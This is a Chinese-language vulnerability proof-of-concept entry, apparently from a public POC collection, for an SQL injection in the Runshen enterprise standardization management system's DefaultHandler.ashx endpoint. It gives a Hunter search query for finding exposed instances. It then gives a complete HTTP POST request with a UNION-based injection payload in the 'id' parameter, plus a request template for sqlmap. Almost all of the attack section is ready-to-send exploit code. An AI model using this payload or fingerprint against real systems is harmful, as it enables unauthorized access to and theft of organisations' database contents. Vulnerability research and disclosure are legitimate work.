# 润申企业标准化管理系统DefaultHandler存在SQL注入漏洞

# 一、漏洞简介
润申企业标准化管理系统DefaultHandler存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 润申企业标准化管理系统

# 三、资产测绘
+ hunter`web.body="PDCA/js/_publicCom.js"`
+ 特征


# 四、漏洞复现
```plain
POST /ashx/DefaultHandler.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

action=GetDetail&status=300&id=1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2885%29%2BCHAR%28122%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28120%29%2BCHAR%2888%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%28122%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2868%29%2BCHAR%2871%29%2BCHAR%2866%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%28117%29%2BCHAR%2890%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28117%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28100%29%2BCHAR%28111%29%2BCHAR%28118%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28111%29%2BCHAR%2877%29%2BCHAR%2890%29%2BCHAR%28105%29%2BCHAR%28103%29%2BCHAR%28111%29%2BCHAR%2880%29%2BCHAR%28106%29%2BCHAR%2869%29%2BCHAR%2887%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+BUHl
```


sqlmap

```plain
POST /ashx/DefaultHandler.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

action=GetDetail&status=300&id=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/re7d3yel51oishkq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
